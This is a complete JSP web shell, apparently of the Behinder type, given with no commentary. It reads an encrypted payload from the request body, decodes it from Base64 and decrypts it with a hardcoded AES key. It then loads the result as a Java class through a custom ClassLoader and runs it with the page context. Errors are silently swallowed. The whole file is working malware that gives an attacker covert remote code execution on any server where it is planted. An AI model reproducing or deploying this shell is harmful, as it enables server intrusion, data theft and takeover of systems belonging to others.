<%@page import="java.util.*,java.io.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader {
		U(ClassLoader c) {
			super(c);
		}
		public Class g(byte[] b) {
			return super.defineClass(b, 0, b.length);
		}
	}%>
<%
try{
		String key="3ed940dd785317a6";
		request.setAttribute("sky", key);
		String data=request.getReader().readLine();
		if (data!= null) {
			String ver = System.getProperty("java.version");
			byte[] code=null;
	        if (ver.compareTo("1.8") >= 0) {
	            Class Base64 = Class.forName("java.util.Base64");
	            Object Decoder = Base64.getMethod("getDecoder", (Class[]) null).invoke(Base64, (Object[]) null);
	            code = (byte[]) Decoder.getClass().getMethod("decode", new Class[]{byte[].class}).invoke(Decoder, new Object[]{data.getBytes("UTF-8")});
	        } else {
	            Class Base64 = Class.forName("sun.misc.BASE64Decoder");
	            Object Decoder = Base64.newInstance();
	            code = (byte[]) Decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(Decoder, new Object[]{data});
	        }
			Cipher c = Cipher.getInstance("AES");
			c.init(2, new SecretKeySpec(key.getBytes(), "AES"));
			new U(this.getClass().getClassLoader()).g(c.doFinal(code)).newInstance().equals(pageContext);
		}
	}catch(Exception e){
};
out=pageContext.pushBody();
%>